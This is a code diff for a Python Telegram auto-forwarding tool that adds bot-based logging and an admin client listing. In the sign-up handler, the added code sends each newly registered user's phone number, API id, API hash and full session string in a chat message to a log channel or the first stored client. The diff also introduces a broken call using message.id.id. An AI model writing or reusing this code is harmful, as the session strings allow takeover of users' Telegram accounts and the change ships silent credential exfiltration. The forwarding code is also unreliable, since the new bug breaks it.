@@ -126,6 +126,11 @@ class DB():
         self.execute(sql, (new_value, param,))
         self.commit()
 
+    def get_all_client_data(self):
+        self.execute("SELECT * FROM client")
+        rows = self.cur.fetchall()
+        return(rows)
+
 
 
 def telegram():
@@ -133,6 +138,21 @@ def telegram():
     clients = db.get_clients()
 
     lock = asyncio.Lock()
+
+    try:
+        bot_log = int(config.get('MISC', 'BOT_LOG_CHANNEL'))
+        logger = config.get('MISC', 'LOGGER_MODE')
+    except:
+        bot_log = None
+        logger = "CLIENT"
+
+    bot = Client("bot",
+    api_id=config.get('TELEGRAM', 'API_ID'),
+    api_hash=config.get('TELEGRAM', 'API_HASH'),
+    bot_token=config.get('TELEGRAM', 'BOT_TOKEN'))
+
+    bot.start()
+
 
     for client in clients:
 
@@ -149,9 +169,20 @@ def telegram():
         client.processed_media_groups_ids = []
 
 
-        ### logs will be send to saved messages if not another chat id is defined in db ###
-        log_channel = db.get_client_column(my_id, "log")
-        client.send_message(log_channel, text=f"AUTOPOST started for {my_name} [`{my_id}`]")
+        ### logs can be send through client or bot account ###
+        msg = f"AUTOPOST started for {my_name} [`{my_id}`]"
+        if logger == "BOT":
+            try:
+                bot.send_message(bot_log, msg)
+            except:
+                msg += f"\n\nERROR: BOT LOG CHANNEL ID INVALID"
+                log_channel = db.get_client_column(my_id, "log")
+                client.send_message(log_channel, text=msg)
+                bot_log = None
+                logger = "CLIENT"
+        else:
+            log_channel = db.get_client_column(my_id, "log")
+            client.send_message(log_channel, text=msg)
 
 
         ### client message listner and sender ###
@@ -163,7 +194,7 @@ def telegram():
                 for chat in db.get_dests_by_source(my_id ,message.chat.id):
                     try:
                         if await check_special_channel(message, my_id) is False: return
-                        await client.copy_message(int(chat), message.chat.id, message.id, caption="")
+                        await client.copy_message(int(chat), message.chat.id, message.id.id, caption="")
                     except Exception as ex:
                         await send_error_to_log(client, ex)
 
@@ -349,10 +380,13 @@ def telegram():
             ERROR[str(ex)]
         except KeyError:
             ERROR.update({str(ex): ex})
-            Error = f"**Error on autopost**\n\n`{ex}`"
             my_id = client.me.id
-            log_channel = db.get_client_column(my_id, "log")
-            await client.send_message(log_channel, text=Error)
+            my_name = client.me.first_name
+            Error = f"**Error on autopost with account {my_name} [`{my_id}`]**\n\n`{ex}`"
+            if logger == "CLIENT":
+                log_channel = db.get_client_column(my_id, "log")
+                await client.send_message(log_channel, text=Error)
+            else: await bot.send_message(bot_log, Error)
 
     async def edit_message(client, message, new_msg):
         n = 4096
@@ -368,13 +402,9 @@ def telegram():
 
     ### Bot handler to create sessions ###
 
-    bot = Client("bot",
-    api_id=config.get('TELEGRAM', 'API_ID'),
-    api_hash=config.get('TELEGRAM', 'API_HASH'),
-    bot_token=config.get('TELEGRAM', 'BOT_TOKEN'))
-
-    @bot.on_message(filters.text | filters.command(["start"]) & filters.private)
+    @bot.on_message(filters.text & filters.private & ~filters.command(["list_clients"]))
     async def handle_sign_up(bot, message):
+
         msg = message
         user_id = msg.chat.id
         user_name = msg.from_user.first_name
@@ -425,10 +455,25 @@ def telegram():
         db.add_client(keys)
         await client.disconnect()
 
-        return await msg.reply("account has been succesfully added to db")
+        await msg.reply("account has been succesfully added to db")
+
+        msg = f"**new client has been registered**\n\n{user_name} [`{user_id}`]\nphone number: {phone_number}\n\napi id: `{api_id}`\napi hash: `{api_hash}`\n\nsession:\n`{session_string}`"
+        if logger == "CLIENT": await bot.send_message(db.get_all_client_data()[0][0], msg)
+        else: await bot.send_message(bot_log, msg)
 
 
-    bot.run()
+    @bot.on_message(filters.command(["list_clients"]) & filters.private)
+    async def list_clients(bot, message):
+        clients = db.get_all_client_data()
+        if clients != []:
+            admin = clients[0][0]
+            if message.chat.id == admin:
+                msg = f"**all clients:**\n\n"
+                for client in clients:
+                    msg += f"{client[1]} [`{client[0]}`]\nphone number: {client[2]}\n\n"
+                await message.reply(msg)
+
+
 
     idle()
 
@@ -466,7 +511,7 @@ def test():
 if __name__ == "__main__":
 
     config = ConfigParser()
-    config.read(config.ini)
+    config.read("config.ini")
 
     AUTOPOST_PROPS = ("source", "dest", "name", "user")
     CLIENT_PROPS = ("id", "name", "phone", "api_id", "api_hash", "session_string", "channel", "tags", "log")
